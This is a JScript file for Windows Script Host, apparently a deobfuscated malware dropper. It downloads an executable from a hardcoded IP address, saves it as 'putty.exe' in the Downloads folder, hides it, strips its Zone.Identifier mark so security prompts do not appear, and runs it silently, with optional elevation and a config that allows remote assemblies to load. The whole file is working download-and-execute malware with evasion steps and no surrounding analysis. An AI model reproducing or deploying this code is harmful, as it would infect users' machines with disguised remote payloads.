'use strict';
alert = function foo(s){WScript.Echo(s)};

REMOTE_FILE = "http://209.141.61.124/Q-2/IMG_0107803.exe";
LOCAL_FILE = "putty.exe"
LOCAL_DIR = "%userprofile%/Downloads/"
function WriteFile(FileName, Content) {
  var fso  = new ActiveXObject("Scripting.FileSystemObject"); 
  var fh = fso.CreateTextFile(FileName, 2, true);
  fh.Write(Content); 
  fh.Close(); 
}

var fs;
var ws;
var ts;
var shell;
var app;
var http;
fs = new ActiveXObject("Scripting.FileSystemObject"), 
ws = WScript, 
sh = ws["CreateObject"]("WScript.Shell"), 
app = ws["CreateObject"]("Shell.Application"), 
http = ws["CreateObject"]("WinHttp.WinHttpRequest.5.1");

//alert(Scripting.FileSystemObject);
/**
 * @return {?}
 */
function main() {
  var remoteFile = REMOTE_FILE;
  /** @type {string} */
  var building_blocksfilesbuilding_blocks = normalizeFinalFileName(LOCAL_DIR) + "/";
  var name = LOCAL_FILE;
  /** @type {string} */
  var path = building_blocksfilesbuilding_blocks + name;
  /** @type {string} */
  arguments = "";
  /** @type {boolean} */
  var e = ![];
  /** @type {boolean} */
  var prevContentItem = ![];
  return fs["FileExists"](path) || downloadRemoteFile(remoteFile, path) ? (hideFile(path), deleteFileStream(path, "Zone.Identifier"), prevContentItem && createNetConfig(path), run(path, arguments, e)) : ws["Echo"]("Try again later."), 0;
}

/**
 * @param {?} sFile 
 * @param {?} vArguments 
 * @param {string} vOperation 
 * @return {?}
 */
function run(sFile , vArguments , vOperation ) {
  try {
    app["ShellExecute"](sFile , vArguments , null, vOperation  ? "runas" : null, 0);
  } catch (exception) {
    return ![];
  }
  return !![];
}
/**
 * @param {?} result
 * @return {?}
 */
function hideFile(result) {
  var files = normalizeFinalFileName(result);
  return run("attrib.exe", "+H " + files, ![]);
}
/**
 * @param {?} result
 * @return {?}
 */
function showFile(result) {
  var names = normalizeFinalFileName(result);

  return run("attrib.exe", "-H " + names, ![]);
}
/**
 * @param {?} filePath
 * @return {?}
 */
function deleteFileStream(filePath) {
   return run("powershell", "Remove-Item " + filePath + " -Stream", ![]);
}
/**
 * @param {?} kReaction
 * @return {?}
 */
function normalizeFinalFileName(kReaction) {
  var fd = sh["ExpandEnvironmentStrings"](kReaction);
  var r = fs["GetAbsolutePathName"](fd);
  return r;
}
/**
 * @param {?} result
 * @return {?}
 */
function createNetConfig(result) {

  var json = normalizeFinalFileName(result);

  var data = json + ".config";

  try {
    var c = ws["CreateObject"]("ADODB.Stream");
    /** @type {number} */
    c["Type"] = 2;
    c["Open"]();
    c["WriteText"]('<?xml version="1.0" encoding="utf-8" ?>');
    c["WriteText"]('<configuration>');
    c["WriteText"]('	<runtime>');
    c["WriteText"]('		<loadFromRemoteSources enabled="true"/>');
    c["WriteText"]('	</runtime>');
    c["WriteText"]('	<startup>');
    c["WriteText"]('		<supportedRuntime version="v2.0.50727" />');
    c["WriteText"]('		<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />');
    c["WriteText"]('	</startup>');
    c["WriteText"]('</configuration>');
    if (fs["FileExists"](data)) {
      try {
        fs["DeleteFile"](data);
      } catch (exception) {
        return ![];
      }
    }
    c["SaveToFile"](data, 2);
    c["Close"]();  
    /** @type {null} */
    c = null;
  } catch (exception) {
    return ![];
  }
  return !![];
}

/**
 * @param {?} remoteFile
 * @param {?} localFile
 * @return {?}
 */
function downloadRemoteFile(remoteFile, localFile) {
  var expandedLocalFile = normalizeFinalFileName(localFile);
  try {
    http["SetProxy"](0);
    http["Open"]("GET", remoteFile, ![]);
    http["Send"]();
    if (http["Status"] == 200) {
      var fileStream = ws["CreateObject"]("ADODB.Stream");
      fileStream["Open"]();



      /** @type {number} */
      fileStream["Type"] = 1;
      fileStream["Write"](http["ResponseBody"]);
      /** @type {number} */
      fileStream["Position"] = 0;
      if (fs["FileExists"](expandedLocalFile)) {
        try {
          fs["DeleteFile"](expandedLocalFile);
        } catch (exception) {
          return ![];
        }
      }
      fileStream["SaveToFile"](expandedLocalFile, 2);
      fileStream["Close"]();
      /** @type {null} */
      fileStream = null;
    }
  } catch (exception) {
    return ![];
  }
  return !![];
}


//alert(_0x32a2ab(800));
//WriteFile("jsdebugoutput.txt", _0x54d1)
main();
